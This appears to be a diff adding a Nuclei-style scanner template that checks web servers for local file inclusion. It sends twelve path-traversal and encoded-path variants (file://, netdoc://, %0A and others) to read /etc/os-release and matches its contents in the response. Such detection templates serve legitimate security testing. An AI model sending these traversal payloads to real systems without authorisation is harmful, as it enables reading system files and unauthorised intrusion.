@@ -1,0 +1,43 @@
+id: lfi
+
+info:
+  name: Generic Linux - Local File Inclusion
+  author: raff
+  severity: high
+  description: Generic Linux is subject to local file Inclusion on searches for /etc/os-release on passed URLs.
+  reference: https://github.com/imhunterand/ApachSAL/blob/main/assets/exploits.json
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 12
+  tags: linux,lfi,generic
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/etc/os-release"
+      - "{{BaseURL}}///etc/os-release"
+      - "{{BaseURL}}/\\etc/os-release"
+      - "{{BaseURL}}/////etc/os-release"
+      - "{{BaseURL}}/\\\\etc/os-release"
+      - "{{BaseURL}}/file://etc/os-release"
+      - "{{BaseURL}}/file:///etc/os-release"
+      - "{{BaseURL}}/file://\\/\\/etc/os-release"
+      - "{{BaseURL}}/netdoc:///etc/os-release"
+      - "{{BaseURL}}/%09/etc/os-release"
+      - "{{BaseURL}}/%0A/etc/os-release"
+      - "{{BaseURL}}/%0D/etc/os-release"
+     
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        words:
+          - "PRETTY_NAME="
+          - "BUG_REPORT_URL="
+          - "SUPPORT_URL="
+        part: body
+        condition: and
+
+# digest: 4b0a00483046022100d60dc51cb537067ff6eca1c394ad8c07ba4dbdaadb17984f72000e5993edcccf022100aadc1f2330b9f86addc6ecd8a283f2d57af8da34c7a8a9bea153c92730017824:922c64590222798bb761d5b6d8e72950
